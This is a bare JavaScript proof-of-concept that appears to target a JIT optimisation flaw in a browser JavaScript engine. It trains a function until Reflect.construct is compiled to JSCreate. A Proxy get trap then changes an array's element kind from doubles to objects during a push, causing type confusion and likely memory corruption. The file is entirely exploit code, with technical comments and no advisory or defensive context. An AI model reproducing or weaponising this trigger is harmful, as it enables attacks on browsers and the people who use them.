let arr = new Array(0x10002);
arr[0] = 1.1; // element size is 8-byte
for (let i = 0; i < 0x10001; i++) { arr.pop(); } // free up space for push

let p = new Proxy(Object, {
    get(target, prop, receiver) {
        arr[0] = {}; // element size is 4-byte
        return Reflect.get(...arguments);
    }
});

function empty() { }

function f(new_target) {
    // add JSCreate to effect chain of |arr|
    // same as arr.push(2.2)
    return arr.push(Reflect.construct(empty, arguments, new_target) ? 2.2 : 0);
}

function ff(new_target) {
    // if |f()| is outermost, |Reflect.construct()| is not be optimized to JSCreate
    // so wrap |f()| with |ff()|
    return f(new_target);
}

// trigger optimization
for (let i = 0; i < 0x10000; i++) { ff(empty); }

ff(p);
